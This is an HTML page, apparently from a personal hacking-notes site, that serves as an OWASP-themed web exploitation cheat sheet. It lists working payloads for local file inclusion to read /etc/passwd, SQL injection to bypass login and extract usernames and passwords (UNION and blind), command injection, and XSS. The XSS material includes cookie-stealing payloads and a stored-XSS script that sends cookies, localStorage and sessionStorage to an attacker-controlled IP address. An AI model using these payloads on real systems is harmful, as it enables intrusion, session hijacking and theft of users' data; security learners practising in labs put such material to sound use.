<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
    <title>Minimalist Webpage</title>

</head>
<body>
    <div id="navbar-container"></div>
    <script src="/H4ckV4ult/components/navbar.js"></script>

    <div class="notion-container">
        <div class="notion-header">
            <h1>OWASP</h1>
            <p>The OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.</p>
        </div>
        <div class="notion-body">
            <h2>Exploitation</h2>
            <ul>
            </div>
                    <h2>Local File Inclusion</h2>
                    <ul>
                        <h3>Local File Inclusion using UNICODE chars</h3>
                        <p>Normally there are sanitizations that prevent for LFI but in some cases you could be able to bypass them by using UNICODE chars take a look at <a class="notion-link" href="https://book.hacktricks.wiki/en/pentesting-web/unicode-injection/unicode-normalization.html"> Hacktricks</a></p>
                        <pre><code class="language-bash">%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd</code></pre>    
                    </ul>

                    <h2>SQL injection</h2>
                    <ul>
                        <p> Basic payloads</p>
                        <pre><code class="language-sql">'+OR+1=1--
' OR 1=1; --
' OR '1'='1
" OR "1"="1" --
' OR 1=1 --
' --</code></pre>
                <h3> Microsoft, PostgreSQL, MySQL </h3>            
                <h4> Show all database tables</h4>
                
                <h4> Show columns of a specific table </h4>
                <pre><code class="language-sql">'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</code></pre>
                <h4> Show data of a table </h4>
                <pre><code class="language-sql">'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--</code></pre>

                <h3> Oracle  </h3>            
                <h4> Show all database tables   </h4>
                <pre><code class="language-sql">'+UNION+SELECT+table_name,null+FROM+all_tables--</code></pre>
                <h4> Show columns of a specific table </h4>
                <pre><code class="language-sql">'+UNION+SELECT+column_name,null+FROM+all_tab_columns+WHERE+table_name=%27USERS_LRGIXZ%27--</code></pre>
                <h4> Show data of a table </h4>
                <pre><code class="language-sql">%27+UNION+SELECT+USERNAME_TTKTKD,PASSWORD_ABIXLF+FROM+USERS_LRGIXZ--</code></pre>

                <h3> Blind SQL injection </h3>
                Rememer to intercept the requests since in this case the injection has been made in the cookie.
                In this case it has been detected that if the query was valid a string was displayed on the screen.
                To check if a table exists we can use the following command
                <pre><code class="language-sql">' AND (SELECT 'a' FROM users LIMIT 1)='a</code></pre>
                We used the following query to check letter by letter the password
                <pre><code class="language-sql">' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code></pre>
                
                <h3> Situations</h3>
                It is possible that to determine which parameter is injectable within the union we have to
                insert text in any of them trying the following way. If we can make it not jump
                no error would mean that this parameter is injectable   
                <pre><code class="language-sql">'+UNION+SELECT+NULL+'text'--</code></pre>
               
                </ul> 
                    <h2>XSS</h2>
                    <ul>
                        <p>Remember to try all diferent inputs to detect XSS</p>
                        <h3>Links of interes</h3>
                        <ul>
                            <li> <a class="notion-link" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#other-useful-attributes"> XSS Cheatsheet</a> <br> </li>
                            <li> <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md"> Payload all the things</a></li>
                        </ul>
                        
                        <h3>Common payloads</h3>
                        <pre><code class="language-js">&lt;script&gt; alert('') &lt;/script&gt;</code></pre>
                        <pre><code class="language-js">&lt;img src =q onerror=alert()&gt;</code></pre>
                        <pre><code class="language-js">&lt;link&gt; rel="stylesheet" href="javascript:alert('');"&gt;</code></pre>

                        <h3>Cookie harvesting</h3>
                        <p>Once you have identified an XSS attempt to capture cookies</p>
                        <pre><code class="language-js">&lt;img src="1" onerror=fetch("http://10.10.14.22:8082/"%2Bdocument.cookie)&gt;</code></pre>
                        
                        
                        <h3>Situations</h3>
                        
                        In case you find that parameters are passed through the URL you can try adding a new parameter and injecting the code there since it is not sanitized. 
                        Here what has been done is to close the select and inject the code there.
                        <pre><code class="language-js">https://URL.com/product?productId=2&storeId=&lt;/select&gt;&lt;svg onload=alert(1)&gt;</code></pre>

                        <p>In case you find out that XSS stored is available in a website you can run the following code in order to capture diferent parameters from the user who visit the affected website. Capture it using a python server</p>
                        <pre><code class="language-js">&lt;script&gt;
    // Crear un objeto XMLHttpRequest para enviar la informaci칩n al servidor
    var xhr = new XMLHttpRequest();
    
    // Recopilar informaci칩n del navegador
    var userAgent = navigator.userAgent;  // Informaci칩n del navegador
    var referer = document.referrer;  // Referer de la p치gina
    var url = window.location.href;  // URL actual
    var cookies = document.cookie;  // Cookies del navegador
    var localStorageData = JSON.stringify(localStorage);  // Datos de localStorage
    var sessionStorageData = JSON.stringify(sessionStorage);  // Datos de sessionStorage
    var screenWidth = screen.width;  // Ancho de la pantalla
    var screenHeight = screen.height;  // Alto de la pantalla

    // Recopilar todos los datos en una cadena de consulta
    var data = "userAgent=" + encodeURIComponent(userAgent) +
               "&referer=" + encodeURIComponent(referer) +
               "&url=" + encodeURIComponent(url) +
               "&cookies=" + encodeURIComponent(cookies) +
               "&localStorage=" + encodeURIComponent(localStorageData) +
               "&sessionStorage=" + encodeURIComponent(sessionStorageData) +
               "&screenWidth=" + encodeURIComponent(screenWidth) +
               "&screenHeight=" + encodeURIComponent(screenHeight);

    // Enviar los datos al servidor usando un GET
    xhr.open("GET", "http://10.8.0.22:8080/" + data, true);
    xhr.send();
&lt;/script&gt;
</code></pre>

                        <p> Avoiding WAF</p>
                        In other situations where the WAF blocks most of the tags, a brute force attack can be carried out to try the tags that are allowed. In the links above you will find a list of tags and attributes.
                    </ul>
                    <h2>Command Injection</h2>
                    <ul>
                        <h3>Situations</h3>
                        <p>In case you are trying to inject code and you know that in the background there is a bash file which will reciep your command you can try to use</p>
                        <p><b>;</b> to stop the current command and execute the following and <b>#</b> to comment the rest</p>
                        <pre><code class="language-bash">/etc/passwd; whoami #</code></pre>
                    </ul>
                    <h2>SSTI (Server Side Template Injection)</h2>
                    <ul>
                        <p>All payloads can be found <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">Here</a></p>
                        <p>Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages</p>
                    </ul>
                </div>
            </ul>
        </div>
    </div>
</body>
</html>